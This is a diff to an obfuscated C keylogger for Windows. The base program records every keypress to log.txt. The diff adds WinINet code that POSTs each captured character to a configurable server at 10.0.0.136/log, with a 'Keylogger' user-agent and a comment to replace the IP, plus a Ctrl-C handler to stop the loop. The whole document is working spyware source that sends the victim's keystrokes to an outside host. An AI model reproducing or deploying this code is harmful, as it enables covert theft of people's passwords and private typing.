@@ -2,6 +2,8 @@
 #include <windows.h>
 #include <stdbool.h>
 #include <ctype.h>
+#include <wininet.h>
+#pragma comment(lib, "wininet.lib")
 
 #define U8G VK_SHIFT
 #define P2D VK_CAPITAL
@@ -19,6 +21,35 @@
 #define T5R 0x8000
 
 #define J8H "log.txt"
+
+volatile BOOL keepRunning = TRUE;
+
+BOOL WINAPI ConsoleHandler(DWORD signal) {
+	if (signal == CTRL_C_EVENT) {
+		keepRunning = FALSE;
+		return TRUE;
+	}
+	return FALSE;
+}
+
+void send_to_server(const char* data) {
+    HINTERNET hInternet = InternetOpen("Keylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (hInternet) {
+        HINTERNET hConnect = InternetConnect(hInternet, "10.0.0.136", 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);  // Replace with your IP
+        if (hConnect) {
+            HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/log", NULL, NULL, NULL, 0, 0);
+            if (hRequest) {
+                char headers[] = "Content-Type: application/x-www-form-urlencoded";
+                char body[1024];
+                snprintf(body, sizeof(body), "data=%s", data);
+                HttpSendRequest(hRequest, headers, strlen(headers), body, strlen(body));
+                InternetCloseHandle(hRequest);
+            }
+            InternetCloseHandle(hConnect);
+        }
+        InternetCloseHandle(hInternet);
+    }
+}
 
 int z1Z() {
     return (V2Q(U8G) & T5R) != 0;
@@ -72,6 +103,7 @@ char o9A(int k) {
 }
 
 int main() {
+	SetConsoleCtrlHandler(ConsoleHandler, TRUE);
     HWND w4C = K0X();
     N1S(w4C, S2Y);
 
@@ -81,7 +113,7 @@ int main() {
 
     bool K1F[256] = {false};
 
-    while (1) {
+    while (keepRunning) {
         for (int k = 8; k <= 255; k++) {
             if (V2Q(k) & T5R) {
                 if (!K1F[k]) {
@@ -89,6 +121,8 @@ int main() {
                     if (ch != '\0') {
                         B8K(f7F, "%c", ch);
                         R0G(f7F);
+						char packet[2] = { ch, '\0' };
+						send_to_server(packet);
                     }
                     K1F[k] = true;
                 }
